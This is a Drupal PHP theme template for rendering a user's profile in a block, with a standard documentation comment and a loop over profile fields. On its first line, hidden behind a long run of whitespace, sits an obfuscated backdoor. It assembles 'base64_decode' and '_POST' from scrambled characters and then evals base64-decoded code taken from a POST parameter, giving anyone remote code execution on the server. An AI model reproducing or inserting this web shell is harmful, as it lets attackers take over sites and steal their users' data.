<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['nf98365'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Default theme implementation for displaying a users profile within a
 * block. It only shows in relation to a node displayed as a full page.
 *
 * Available variables:
 * - $user_picture: Image configured for the account linking to the users page.
 * - $profile: Keyed array of all profile fields that have a value.
 *
 * Each $field in $profile contains:
 * - $field->title: Title of the profile field.
 * - $field->value: Value of the profile field.
 * - $field->type: Type of the profile field, i.e., checkbox, textfield,
 *   textarea, selection, list, url or date.
 *
 * Since $profile is keyed, a direct print of the field is possible. Not
 * all accounts may have a value for a profile so do a check first. If a field
 * of "last_name" was set for the site, the following can be used.
 *
 *  <?php if (isset($profile['last_name'])): ?>
 *    <div class="field last-name">
 *      <?php print $profile['last_name']->title; ?>:<br />
 *      <?php print $profile['last_name']->value; ?>
 *    </div>
 *  <?php endif; ?>
 *
 * @see template_preprocess_profile_block()
 */
?>
<?php print $user_picture; ?>

<?php foreach ($profile as $field): ?>
  <p>
    <?php if ($field->type != 'checkbox'): ?>
      <strong><?php print $field->title; ?></strong><br />
    <?php endif; ?>
    <?php print $field->value; ?>
  </p>
<?php endforeach; ?>
